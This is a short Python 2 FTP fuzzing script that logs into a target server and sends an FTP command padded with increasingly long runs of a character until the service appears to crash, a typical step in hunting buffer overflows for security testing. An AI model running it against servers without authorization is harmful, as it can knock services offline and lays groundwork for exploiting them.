#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 6:
	print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum]"
	print "Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000"
	print "Example will fuzz the defined FTP service with a series of payloads"
	print "to include 100 'A's, 200 'A's, etc... up to the maximum of 1000"
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
char = str(sys.argv[3])
i = int(sys.argv[4])
interval = int(sys.argv[4])
max = int(sys.argv[5])
user = raw_input(str("Enter ftp username: "))
passwd = raw_input(str("Enter ftp password: "))
command = raw_input(str("Enter FTP command to fuzz: "))

while i <= max:
	try:
		payload = command + " " + (char * i)
		print "Sending " + str(i) + " instances of payload (" + char + ") to target"
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((target,port))
		s.recv(1024)
		s.send('USER ' + user + '\r\n')
		s.recv(1024)
		s.send('PASS ' + passwd + '\r\n')
		s.recv(1024)
		s.send(payload + '\r\n')
		s.send('QUIT\r\n')
		s.recv(1024)
		s.close()
		i = i + interval
	except:
		print "\nUnable to send...Server may have crashed"
		sys.exit()
print "\nThere is no indication that the server has crashed"